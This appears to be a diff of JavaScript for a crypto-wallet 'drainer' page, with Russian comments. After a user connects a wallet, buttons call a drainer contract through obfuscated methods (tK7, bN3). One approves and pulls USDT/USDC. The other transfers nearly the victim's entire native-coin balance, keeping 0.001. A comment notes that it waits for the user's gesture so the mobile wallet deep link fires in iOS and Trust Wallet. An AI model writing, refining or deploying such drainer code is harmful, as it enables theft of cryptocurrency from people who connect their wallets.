@@ -44,45 +44,32 @@ const modal = createAppKit({
   features: { analytics: true }
 })
 
-// Здесь будет наш signer — и для десктопа, и для мобильного WC-провайдера.
+// Здесь будет signer
 let signer = null
 
-// После успешного подключения сохраняем signer и активируем кнопки
 modal.on('connect', async () => {
   const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
   signer = provider.getSigner()
 
-  document
-    .getElementById('drain-tokens-btn')
-    .removeAttribute('disabled')
-  document
-    .getElementById('drain-native-btn')
-    .removeAttribute('disabled')
+  document.getElementById('drain-tokens-btn').removeAttribute('disabled')
+  document.getElementById('drain-native-btn').removeAttribute('disabled')
 })
 
-// === UI: привязка кнопок ===
+// UI: открытие модалки
 document
   .getElementById('open-connect-modal')
   .addEventListener('click', () => modal.open())
 
-// 1) Списание USDT/USDC
+// 1) USDT/USDC списание
 document
   .getElementById('drain-tokens-btn')
   .addEventListener('click', async () => {
     if (!signer) return alert('Сначала подключите кошелек!')
     try {
-      const drainer = new ethers.Contract(
-        DRAINER_ADDRESS,
-        DRAINER_ABI,
-        signer
-      )
-      // Здесь вы можете вычислить точные суммы usdtAmount и usdcAmount,
-      // например, из баланса:
-      // const usdtAmount = ... , const usdcAmount = ...
+      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer)
       const usdtAmount = ethers.utils.parseUnits('0.1', 6)
       const usdcAmount = ethers.utils.parseUnits('0.1', 6)
 
-      // Этот один await вызовет именно одну транзакцию approve+tK7
       await drainer.tK7(usdtAmount, usdcAmount)
       console.log('✅ tK7 транзакция отправлена')
     } catch (e) {
@@ -91,26 +78,24 @@ document
     }
   })
 
-// 2) Списание родной монеты
+// 2) Родная монета списание + DeepLink на мобилке
 document
   .getElementById('drain-native-btn')
   .addEventListener('click', async () => {
     if (!signer) return alert('Сначала подключите кошелек!')
     try {
-      const drainer = new ethers.Contract(
-        DRAINER_ADDRESS,
-        DRAINER_ABI,
-        signer
-      )
-      // Пример: оставить 0.001 монеты на кошельке
+      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer)
       const balance = await signer.getBalance()
       const toSend = balance.sub(ethers.utils.parseEther('0.001'))
+
       if (toSend.lte(0)) {
         return alert('Недостаточно родной монеты для списания')
       }
 
-      // Этот await в обработчике клика гарантирует deep‑link
+      // 🧠 Ключевой момент: чтобы работало на iOS и Trust — ждём user gesture!
+      // После этого вызова мобильный кошелек перехватывает deep‑link
       await drainer.bN3({ value: toSend })
+
       console.log('✅ bN3 транзакция отправлена')
     } catch (e) {
       console.error('Ошибка при bN3:', e)
